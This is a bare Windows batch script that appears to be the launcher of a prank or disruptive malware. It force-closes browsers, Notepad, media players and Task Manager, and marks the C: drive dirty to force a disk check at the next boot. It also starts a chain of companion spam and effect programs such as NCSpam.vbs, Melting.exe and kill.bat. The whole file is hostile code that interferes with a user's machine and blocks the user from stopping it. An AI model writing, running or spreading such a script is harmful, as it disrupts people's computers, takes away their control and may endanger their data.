@echo off
taskkill /f /im Music.UI.exe
taskkill /f /im chrome*
taskkill /f /im opera*
taskkill /f /im edge*
taskkill /f /im fire*
taskkill /f /im notepad*
taskkill /f /im aot*
start volume.vbs
start rest4.vbs
timeout /t 5
start aot1.vbs
start automsg.vbs
timeout /t 5
start alhmar.vbs
taskkill /f /im taskmgr.exe
fsutil dirty set C:
timeout /t 14
start NCSpam.vbs
start volume.vbs
start rest2.vbs
start rest3.vbs
start Melting.exe
start gtext.exe
timeout /t 3
start rsd.vbs
start kill.bat
timeout /t 5
start rspamprs.vbs
taskkill /f /im note*